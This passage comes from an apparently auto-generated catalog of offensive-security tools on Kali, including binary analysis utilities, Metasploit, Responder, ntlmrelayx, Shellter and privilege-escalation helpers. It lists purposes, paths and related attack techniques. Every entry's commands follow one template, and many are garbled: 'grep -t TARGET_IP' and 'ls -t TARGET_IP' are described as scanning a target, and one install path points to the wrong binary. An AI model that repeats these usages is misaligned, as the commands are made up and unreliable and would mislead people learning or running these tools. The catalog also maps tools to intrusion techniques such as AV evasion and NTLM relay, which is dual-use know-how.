- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Strings**: `strings --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Strings help and available flags
  - **Scan target with Strings**: `strings -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force, heap-tcache-poison
- Related Tools: 10 — ROPgadget, angr, checksec, file, gcc, gdb, gdb-multiarch, gdb-peda, gef, ghidra

#### readelf — Readelf
- Zone: binary-exploitation | Category: binary-exploitation | Type: binary
- OS: linux
- Purpose: Display ELF header and section info
- Tags: binary-exploitation, binary
- Install (kali): /usr/bin/readelf
- Path: /usr/bin/readelf
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Readelf**: `readelf --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Readelf help and available flags
  - **Scan target with Readelf**: `readelf -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force, heap-tcache-poison
- Related Tools: 10 — ROPgadget, angr, checksec, file, gcc, gdb, gdb-multiarch, gdb-peda, gef, ghidra

#### objdump — Objdump
- Zone: binary-exploitation | Category: binary-exploitation | Type: binary
- OS: linux
- Purpose: Disassemble and display binary object info
- Tags: binary-exploitation, binary
- Install (kali): /usr/bin/objdump
- Path: /usr/bin/objdump
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Objdump**: `objdump --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Objdump help and available flags
  - **Scan target with Objdump**: `objdump -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force, heap-tcache-poison
- Related Tools: 10 — ROPgadget, angr, checksec, file, gcc, gdb, gdb-multiarch, gdb-peda, gef, ghidra

#### grep — Grep
- Zone: recon | Category: recon | Type: binary
- OS: linux
- Purpose: Search text patterns in output
- Tags: recon, binary
- Install (kali): /usr/bin/grep
- Path: /usr/bin/grep
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Grep**: `grep --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Grep help and available flags
  - **Scan target with Grep**: `grep -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, dns-enumeration, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force
- Related Tools: 10 — amass, curl, dig, docker, foca, git, httpx, ivre, masscan, metagoofil

#### find — Find
- Zone: privilege-escalation | Category: privilege-escalation | Type: binary
- OS: linux
- Purpose: Search for files by name, perms, owner
- Tags: privilege-escalation, binary
- Install (kali): /usr/bin/find
- Path: /usr/bin/find
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Find**: `find --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Find help and available flags
  - **Scan target with Find**: `find -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-genericall, acl-abuse-writedacl, always-install-elevated, blind-rop, buffer-overflow, canary-leak, cron-jobs, dll-hijacking, format-string
- Related Tools: 10 — accesschk, getcap, icacls, jucypotato, linenum, linpeas, linux-exploit-suggester, lse, powerup, pspy

#### ls — Ls
- Zone: network-enum | Category: network-enum | Type: binary
- OS: linux
- Purpose: List directory contents
- Tags: network-enum, binary
- Install (kali): /usr/bin/ls
- Path: /usr/bin/ls
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Ls**: `ls --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Ls help and available flags
  - **Scan target with Ls**: `ls -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — arp-discovery, blind-rop, buffer-overflow, canary-leak, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force
- Related Tools: 8 — arp-scan, ip, netdiscover, onesixtyone, showmount, smbclient, smbmap, snmpwalk

#### git — Git
- Zone: recon | Category: recon | Type: binary
- OS: linux
- Purpose: Version control; used by many exploit tools
- Tags: general, binary
- Install (kali): /usr/bin/git
- Path: /usr/bin/git
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Git**: `git --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Git help and available flags
  - **Scan target with Git**: `git -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — blind-rop, buffer-overflow, c2-establishment, canary-leak, dns-enumeration, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup
- Related Tools: 7 — curl, dig, docker, grep, nslookup, python3, wget

#### python3 — Python3
- Zone: recon | Category: recon | Type: interpreter
- OS: linux
- Purpose: Python 3 interpreter for running scripts
- Tags: general, interpreter
- Install (kali): /usr/bin/python3
- Path: /usr/bin/python3
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Python3**: `python3 --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Python3 help and available flags
  - **Scan target with Python3**: `python3 -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 14 — dns-enumeration, passive-recon, tech:kerberoasting, tech:llmnr-nbtspoofing, tech:ntlm-cracking, tech:pass-the-hash, tech:password-spraying, tech:powerview, tech:ps-remoting, tech:psexec
- Related Tools: 2 — docker, git

#### scp — Scp
- Zone: lateral-movement | Category: lateral-movement | Type: binary
- OS: linux
- Purpose: Secure copy protocol for file transfer
- Tags: lateral-movement, binary
- Install (kali): /usr/bin/scp
- Path: /usr/bin/scp
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Scp**: `scp --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Scp help and available flags
  - **Scan target with Scp**: `scp -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, double-pivot, file-inclusion, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup
- Related Tools: 6 — chisel, ligolo-ng, proxychains4, socat, ssh, sshuttle

#### ssh — Ssh
- Zone: lateral-movement | Category: lateral-movement | Type: binary
- OS: linux
- Purpose: SSH client for shell and tunnel access
- Tags: lateral-movement, binary
- Install (kali): /usr/bin/ssh
- Path: /usr/bin/ssh
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Ssh**: `ssh --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Ssh help and available flags
  - **Scan target with Ssh**: `ssh -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, double-pivot, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force
- Related Tools: 6 — chisel, ligolo-ng, proxychains4, scp, socat, sshuttle

#### screen — Screen
- Zone: post-exploitation | Category: post-exploitation | Type: binary
- OS: linux
- Purpose: Terminal multiplexer for persistent sessions
- Tags: post-exploitation, binary
- Install (kali): /usr/bin/screen
- Path: /usr/bin/screen
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Screen**: `screen --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Screen help and available flags
  - **Scan target with Screen**: `screen -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — blind-rop, buffer-overflow, c2-establishment, canary-leak, credential-harvesting, credential-harvesting-advanced, format-string, format-string-exploit, got-overwrite, heap-double-free
- Related Tools: 5 — covenant, empire, lazagne, nishang, sliver

#### sudo — Sudo
- Zone: privilege-escalation | Category: privilege-escalation | Type: binary
- OS: linux
- Purpose: Execute commands as another user (root)
- Tags: privilege-escalation, binary
- Install (kali): /usr/bin/sudo
- Path: /usr/bin/sudo
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Sudo**: `sudo --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Sudo help and available flags
  - **Scan target with Sudo**: `sudo -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-genericall, acl-abuse-writedacl, adcs-esc1, always-install-elevated, blind-rop, buffer-overflow, canary-leak, cron-jobs, dll-hijacking
- Related Tools: 10 — accesschk, find, getcap, icacls, jucypotato, linenum, linpeas, linux-exploit-suggester, lse, powerup

#### ip — Ip
- Zone: network-enum | Category: network-enum | Type: binary
- OS: linux
- Purpose: Display and configure network interfaces
- Tags: network-enum, binary
- Install (kali): /usr/sbin/ip
- Path: /usr/sbin/ip
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Ip**: `ip --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Ip help and available flags
  - **Scan target with Ip**: `ip -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — arp-discovery, blind-rop, buffer-overflow, canary-leak, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force
- Related Tools: 8 — arp-scan, ls, netdiscover, onesixtyone, showmount, smbclient, smbmap, snmpwalk

#### reg — Reg
- Zone: privilege-escalation | Category: privilege-escalation | Type: binary
- OS: windows
- Purpose: Windows registry manipulation tool
- Tags: privilege-escalation, binary
- Install (kali): clone reg
- Path: C:\Windows\System32\reg.exe
- Notes: Standard system binary
- Commands (2):
  - **Primary usage of Reg**: `reg --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Reg help and available flags
  - **Scan target with Reg**: `reg -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-genericall, acl-abuse-writedacl, always-install-elevated, blind-rop, buffer-overflow, canary-leak, cron-jobs, dll-hijacking, format-string
- Related Tools: 10 — accesschk, find, getcap, icacls, jucypotato, linenum, linpeas, linux-exploit-suggester, lse, powerup

#### icacls — Icacls
- Zone: privilege-escalation | Category: privilege-escalation | Type: binary
- OS: windows
- Purpose: Windows ACL display/editing tool
- Tags: privilege-escalation, binary
- Install (kali): clone icacls
- Path: C:\Windows\System32\icacls.exe
- Notes: Standard system binary
- Commands (2):
  - **Primary usage of Icacls**: `icacls --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Icacls help and available flags
  - **Scan target with Icacls**: `icacls -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, always-install-elevated, blind-rop, buffer-overflow, canary-leak, cron-jobs
- Related Tools: 10 — accesschk, find, getcap, jucypotato, linenum, linpeas, linux-exploit-suggester, lse, powerup, pspy

#### wmic — Wmic
- Zone: privilege-escalation | Category: privilege-escalation | Type: binary
- OS: windows
- Purpose: Windows Management Instrumentation CLI
- Tags: privilege-escalation, binary
- Install (kali): clone wmic
- Path: C:\Windows\System32\wbem\wmic.exe
- Notes: Standard system binary
- Commands (2):
  - **Primary usage of Wmic**: `wmic --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Wmic help and available flags
  - **Scan target with Wmic**: `wmic -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-genericall, acl-abuse-writedacl, always-install-elevated, blind-rop, buffer-overflow, c2-establishment, canary-leak, cron-jobs, dll-hijacking
- Related Tools: 10 — accesschk, find, getcap, icacls, jucypotato, linenum, linpeas, linux-exploit-suggester, lse, powerup

#### showmount — Showmount
- Zone: network-enum | Category: network-enum | Type: binary
- OS: linux
- Purpose: Query NFS exports
- Tags: network-enum, binary
- Install (kali): /usr/sbin/showmount
- Path: /usr/sbin/showmount
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Showmount**: `showmount --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Showmount help and available flags
  - **Scan target with Showmount**: `showmount -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — arp-discovery, blind-rop, buffer-overflow, canary-leak, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force
- Related Tools: 8 — arp-scan, ip, ls, netdiscover, onesixtyone, smbclient, smbmap, snmpwalk

#### getcap — Getcap
- Zone: privilege-escalation | Category: privilege-escalation | Type: binary
- OS: linux
- Purpose: Check Linux file capabilities for privesc paths
- Tags: privilege-escalation, binary
- Install (kali): /usr/sbin/getcap
- Path: /usr/sbin/getcap
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Getcap**: `getcap --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Getcap help and available flags
  - **Scan target with Getcap**: `getcap -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-genericall, acl-abuse-writedacl, always-install-elevated, blind-rop, buffer-overflow, canary-leak, cron-jobs, dll-hijacking, file-inclusion
- Related Tools: 10 — accesschk, find, icacls, jucypotato, linenum, linpeas, linux-exploit-suggester, lse, powerup, pspy

#### pwn — Pwn
- Zone: binary-exploitation | Category: binary-exploitation | Type: script
- OS: linux
- Purpose: pwntools framework CLI
- Tags: binary-exploitation, script
- Install (kali): clone pwn
- Path: /home/saad/.local/bin/pwn
- Notes: Install via pip install pwn
- Commands (2):
  - **Primary usage of Pwn**: `pwn --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Pwn help and available flags
  - **Scan target with Pwn**: `pwn -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force, heap-tcache-poison
- Related Tools: 9 — ROPgadget, file, gcc, gdb-multiarch, gdb-peda, nasm, objdump, readelf, strings

#### mitm6 — Mitm6
- Zone: active-directory | Category: active-directory | Type: python
- OS: linux
- Purpose: IPV6 relay MITM tool for AD attacks
- Tags: active-directory, python
- Install (kali): pip3 install mitm6
- Path: /home/saad/.local/bin/mitm6
- Notes: Install via pip install mitm6
- Commands (2):
  - **Primary usage of Mitm6**: `mitm6 --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Mitm6 help and available flags
  - **Scan target with Mitm6**: `mitm6 -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, constrained-delegation-s4u
- Related Tools: 10 — bloodhound, certipy, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute, ldapsearch

#### ntlmrelayx — Ntlmrelayx
- Zone: active-directory | Category: active-directory | Type: python
- OS: linux
- Purpose: NTLM relay tool (impacket module)
- Tags: active-directory, python
- Install (kali): pip3 install ntlmrelayx
- Path: /usr/bin/impacket-ntlmrelayx
- Notes: Install via pip install ntlmrelayx
- Commands (2):
  - **Primary usage of Ntlmrelayx**: `ntlmrelayx --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Ntlmrelayx help and available flags
  - **Scan target with Ntlmrelayx**: `ntlmrelayx -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, constrained-delegation-s4u
- Related Tools: 10 — bloodhound, certipy, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute, ldapsearch

#### responder — Responder
- Zone: active-directory | Category: active-directory | Type: python
- OS: linux
- Purpose: LLMNR/NBT-NS/MDNS poisoning tool
- Tags: active-directory, python
- Install (kali): responder
- Path: /usr/sbin/responder
- Notes: Install via responder
- Commands (2):
  - **Primary usage of Responder**: `responder --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Responder help and available flags
  - **Scan target with Responder**: `responder -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, constrained-delegation-s4u
- Related Tools: 10 — bloodhound, certipy, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute, ldapsearch

#### msfvenom — Msfvenom
- Zone: exploitation-frameworks | Category: exploitation-frameworks | Type: ruby
- OS: linux
- Purpose: Metasploit payload generator
- Tags: exploitation-frameworks, ruby
- Install (kali): /usr/bin/msfvenom
- Path: /usr/bin/msfvenom
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Msfvenom**: `msfvenom --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Msfvenom help and available flags
  - **Scan target with Msfvenom**: `msfvenom -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 6 — metasploit-exploitation, shellcode-development, tech:cloud-metadata, tech:jenkins-script, tech:persistence-cron, tech:persistence-registry
- Related Tools: 2 — msfconsole, shellter

#### msfconsole — Msfconsole
- Zone: exploitation-frameworks | Category: exploitation-frameworks | Type: ruby
- OS: linux
- Purpose: Metasploit exploitation console
- Tags: exploitation-frameworks, ruby
- Install (kali): /usr/bin/msfconsole
- Path: /usr/bin/msfconsole
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Msfconsole**: `msfconsole --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Msfconsole help and available flags
  - **Scan target with Msfconsole**: `msfconsole -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — buffer-overflow, default-creds-iot, format-string, format-string-exploit, heap-tcache-poison, heap-use-after-free, metasploit-exploitation, rop-chain, shellcode-development, sudo-misconfiguration
- Related Tools: 2 — msfvenom, shellter

#### ROPgadget — ROPgadget
- Zone: binary-exploitation | Category: binary-exploitation | Type: python
- OS: linux
- Purpose: Find ROP gadgets in binaries
- Tags: binary-exploitation, python
- Install (kali): ropgadget
- Path: /home/saad/.local/bin/ROPgadget
- Notes: Install via ropgadget
- Commands (2):
  - **Primary usage of ROPgadget**: `ROPgadget --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows ROPgadget help and available flags
  - **Scan target with ROPgadget**: `ROPgadget -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — blind-rop, buffer-overflow, canary-leak, format-string, format-string-exploit, got-overwrite, heap-double-free, heap-fastbin-dup, heap-house-of-force, heap-tcache-poison
- Related Tools: 10 — file, gcc, gdb-multiarch, gdb-peda, nasm, objdump, pwn, pwntools, readelf, strings

#### accesschk — Accesschk
- Zone: privilege-escalation | Category: privilege-escalation | Type: exe
- OS: windows
- Purpose: Windows permission analysis tool
- Tags: privilege-escalation, exe
- Install (kali): /usr/bin/accesschk
- Path: /usr/bin/accesschk
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Accesschk**: `accesschk --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Accesschk help and available flags
  - **Scan target with Accesschk**: `accesschk -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-genericall, acl-abuse-writedacl, always-install-elevated, cron-jobs, crypto-analysis, dll-hijacking, gpp-cached-passwords, nvram-analysis, persistence
- Related Tools: 10 — find, getcap, icacls, jucypotato, linenum, linpeas, linux-exploit-suggester, lse, powerup, pspy

#### cherrytree — Cherrytree
- Zone: reporting | Category: reporting | Type: gui
- OS: linux
- Purpose: Hierarchical note-taking for pentest reports
- Tags: reporting, gui
- Install (kali): /usr/bin/cherrytree
- Path: /usr/bin/cherrytree
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Cherrytree**: `cherrytree --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Cherrytree help and available flags
  - **Scan target with Cherrytree**: `cherrytree -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 1 — reporting-screenshots
- Related Tools: 3 — aquatone, eyewitness, flameshot

#### pspy — Pspy
- Zone: privilege-escalation | Category: privilege-escalation | Type: go
- OS: linux
- Purpose: Process snooping without root privileges
- Tags: privilege-escalation, go
- Install (kali): /home/saad/Desktop/cpent-toolkit/07-privilege-escalation/pspy64
- Path: /home/saad/Desktop/cpent-toolkit/07-privilege-escalation/pspy64
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Pspy**: `pspy --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Pspy help and available flags
  - **Scan target with Pspy**: `pspy -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-genericall, acl-abuse-writedacl, always-install-elevated, cron-jobs, dll-hijacking, gpp-cached-passwords, registry-autorun, sudo-misconfiguration, suid-abuse
- Related Tools: 10 — accesschk, find, getcap, icacls, jucypotato, linenum, linpeas, linux-exploit-suggester, lse, powerup

#### whatweb — Whatweb
- Zone: recon | Category: recon | Type: ruby
- OS: linux
- Purpose: Web technology fingerprinting tool
- Tags: recon, ruby
- Install (kali): /usr/bin/whatweb
- Path: /usr/bin/whatweb
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Whatweb**: `whatweb --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Whatweb help and available flags
  - **Scan target with Whatweb**: `whatweb -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — burp-workflow, cmdi-advanced, dns-enumeration, file-inclusion, lfi-advanced, passive-recon, sql-injection, ssrf, tech:broken-access-control, tech:csrf
- Related Tools: 10 — amass, curl, dig, foca, grep, httpx, ivre, masscan, metagoofil, naabu

#### git-dumper — Git Dumper
- Zone: web | Category: web | Type: python
- OS: linux
- Purpose: Automated .git directory dumper
- Tags: web, python
- Install (kali): pip3 install git-dumper
- Path: /home/saad/.local/bin/git-dumper
- Notes: Install via pip install git-dumper
- Commands (2):
  - **Primary usage of Git Dumper**: `git-dumper --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Git Dumper help and available flags
  - **Scan target with Git Dumper**: `git-dumper -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — burp-workflow, cmdi-advanced, file-inclusion, lfi-advanced, sql-injection, ssrf, tech:broken-access-control, tech:cloud-metadata, tech:csrf, tech:idor
- Related Tools: 10 — burp-suite, cmsmap, commix, corsy, feroxbuster, ffuf, gobuster, jwt_tool, lfisuite, liffy

#### lse — Lse
- Zone: privilege-escalation | Category: privilege-escalation | Type: bash
- OS: linux
- Purpose: Linux Smart Enumeration for privesc
- Tags: privilege-escalation, bash
- Install (kali): /usr/bin/ls
- Path: /home/saad/Desktop/cpent-toolkit/07-privilege-escalation/linux-smart-enumeration/lse.sh
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Lse**: `lse --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Lse help and available flags
  - **Scan target with Lse**: `lse -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-genericall, acl-abuse-writedacl, always-install-elevated, cron-jobs, delegation-enum, dll-hijacking, dns-enumeration, gpp-cached-passwords, kerberos-delegation-enum
- Related Tools: 10 — accesschk, find, getcap, icacls, jucypotato, linenum, linpeas, linux-exploit-suggester, powerup, pspy

#### shellter — Shellter
- Zone: exploitation-frameworks | Category: exploitation-frameworks | Type: c
- OS: linux
- Purpose: Dynamic shellcode injector / AV evasion
- Tags: exploitation-frameworks, c
- Install (kali): /usr/bin/shellter
- Path: /usr/bin/shellter
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Shellter**: `shellter --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Shellter help and available flags
  - **Scan target with Shellter**: `shellter -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 7 — av-evasion, metasploit-exploitation, shellcode-development, tech:cloud-metadata, tech:jenkins-script, tech:persistence-cron, tech:persistence-registry
- Related Tools: 2 — msfconsole, msfvenom

#### jucypotato — Jucypotato
- Zone: privilege-escalation | Category: privilege-escalation | Type: exe
- OS: windows
- Purpose: Juicy Potato variant for Windows privesc
- Tags: privilege-escalation, exe
- Install (kali): /home/saad/Desktop/cpent-toolkit/privilege-escalation/juicy-potato/JuicyPotato.exe
- Path: /home/saad/Desktop/cpent-toolkit/privilege-escalation/juicy-potato/JuicyPotato.exe
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Jucypotato**: `jucypotato --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Jucypotato help and available flags
  - **Scan target with Jucypotato**: `jucypotato -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-genericall, acl-abuse-writedacl, always-install-elevated, cron-jobs, dll-hijacking, gpp-cached-passwords, persistence, registry-autorun, sudo-misconfiguration
- Related Tools: 10 — accesschk, find, getcap, icacls, linenum, linpeas, linux-exploit-suggester, lse, powerup, pspy

#### watson — Watson
- Zone: privilege-escalation | Category: privilege-escalation | Type: exe
- OS: windows
- Purpose: Enumerate missing KBs for privesc
- Tags: privilege-escalation, exe
- Install (kali): /home/saad/Desktop/cpent-toolkit/07-privilege-escalation/Watson
- Path: /home/saad/Desktop/cpent-toolkit/07-privilege-escalation/Watson
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Watson**: `watson --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Watson help and available flags
  - **Scan target with Watson**: `watson -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-genericall, acl-abuse-writedacl, always-install-elevated, cron-jobs, dll-hijacking, gpp-cached-passwords, registry-autorun, sudo-misconfiguration, suid-abuse
- Related Tools: 10 — accesschk, find, getcap, icacls, jucypotato, linenum, linpeas, linux-exploit-suggester, lse, powerup

#### linux-exploit-suggester — Linux Exploit Suggester
- Zone: privilege-escalation | Category: privilege-escalation | Type: perl
- OS: linux
- Purpose: Linux kernel exploit suggester
- Tags: privilege-escalation, perl
- Install (kali): /home/saad/Desktop/cpent-toolkit/07-privilege-escalation/linux-exploit-suggester/linux-exploit-suggester.sh
- Path: /home/saad/Desktop/cpent-toolkit/07-privilege-escalation/linux-exploit-suggester/linux-exploit-suggester.sh
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Linux Exploit Suggester**: `linux-exploit-suggester --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Linux Exploit Suggester help and available flags
  - **Scan target with Linux Exploit Suggester**: `linux-exploit-suggester -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-genericall, acl-abuse-writedacl, always-install-elevated, cron-jobs, dll-hijacking, gpp-cached-passwords, persistence, registry-autorun, sudo-misconfiguration
- Related Tools: 10 — accesschk, find, getcap, icacls, jucypotato, linenum, linpeas, lse, powerup, pspy

#### openocd — Openocd
- Zone: iot-firmware | Category: iot-firmware | Type: binary
- OS: linux
- Purpose: On-Chip Debugger for JTAG/SWD interfaces
- Tags: iot-firmware, binary
- Install (kali): /usr/bin/openocd
- Path: /usr/bin/openocd
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Openocd**: `openocd --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Openocd help and available flags
  - **Scan target with Openocd**: `openocd -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 15 — blind-rop, bootloader-bypass, buffer-overflow, canary-leak, default-creds-iot, firmware-cgi-injection, firmware-emulation, firmware-extraction, format-string, format-string-exploit
- Related Tools: 5 — flashrom, jtagulator, qemu-arm-static, qemu-mips-static, sqlite3

#### flashrom — Flashrom
- Zone: iot-firmware | Category: iot-firmware | Type: c
- OS: linux
- Purpose: Flash ROM programmer for SPI/NOR chips
- Tags: iot-firmware, c
- Install (kali): /usr/sbin/flashrom
- Path: /usr/sbin/flashrom
- Notes: Pre-installed on Kali
- Commands (2):
  - **Primary usage of Flashrom**: `flashrom --help`
    - When: First-time usage - review available options and syntax
    - Output: Shows Flashrom help and available flags
  - **Scan target with Flashrom**: `flashrom -t TARGET_IP`
    - When: Against a target host or network
    - Output: Scan results showing target information
- Related Techniques: 11 — bootloader-bypass, default-creds-iot, firmware-cgi-injection, firmware-emulation, firmware-extraction, iot-uart-debug, jtag-debugging, mqtt-attack, nvram-analysis, spi-flash-dump
- Related Tools: 5 — jtagulator, openocd, qemu-arm-static, qemu-mips-static, sqlite3

#### gdb-multiarch — Gdb Multiarch
- Zone: binary-exploitation | Category: binary-exploitation | Type: binary
- OS: linux
- Purpose: Multi-architecture GDB for cross-debugging
- Tags: binary-exploitation, binary
- Install (kali): /usr/bin/gdb
- Path: /usr/bin/gdb-multiarch
